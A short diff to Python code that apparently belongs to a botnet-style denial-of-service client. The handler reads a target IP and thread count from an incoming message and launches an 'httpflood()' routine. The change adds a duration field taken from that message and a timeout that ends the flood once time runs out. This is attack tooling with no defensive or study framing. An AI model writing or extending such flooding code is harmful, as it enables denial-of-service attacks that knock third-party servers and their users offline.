@@ -102,6 +102,9 @@ def system():
 						try:
 							ip = msg.split(" ")[1]
 							numThreads = int(msg.split(" ")[2])
+							timer = int(float(msg.split(" ")[3]))
+
+							timeout = time.time() + 1 * timer
 
 							resolvedTarget = socket.gethostbyname(ip)
 
@@ -124,6 +127,9 @@ def system():
 
 							for i in range(1, numThreads):
 								httpflood()
+								if time.time() > timeout:
+									print("done")
+									return
 						except:
 							pass
 					httpflooder()
